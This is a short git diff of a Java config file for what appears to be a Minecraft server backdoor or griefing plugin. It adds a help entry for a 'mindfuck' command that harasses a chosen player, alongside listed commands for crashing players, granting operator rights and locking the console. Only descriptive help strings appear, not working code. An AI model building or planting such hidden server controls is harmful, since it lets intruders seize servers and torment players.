@@ -59,7 +59,6 @@ public class Config {
                                                         "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
 
     // Help message content
-    // rename, reload, getip, sudo, delworld, makeworld, listworlds, vanish, crash, info
     public static final HelpItem[] help_messages = {
             new HelpItem("help",        "[command]",                    "display this message, or description of command."),
             new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
@@ -84,6 +83,7 @@ public class Config {
             new HelpItem("silktouch",   "(player)",                     "gives player silk touch hands (def: nickname)"),
             new HelpItem("instabreak",  "(player)",                     "let's player mine instantly (def: nickname)"),
             new HelpItem("crash",       "[player]",                     "crashes player's name (def: nickname)"),
+            new HelpItem("mindfuck",    "(thrower), (interact), (cripple), (flight), (inventory), (drop), (teleport), (mine), (place), (login) [player]"," fucks with player (def: method nickname)"),
             new HelpItem("lock",        "(player), (all) or (console)", "locks the console or blocks player (def: nickname, all or console)"),
             new HelpItem("unlock",      "(player), (all) or (console)", "unlocks the console or unblocks player (def: nickname, all or console)"),
             new HelpItem("mute",        "(player) or (all)",            "mutes a player (def: nickname or all)"),
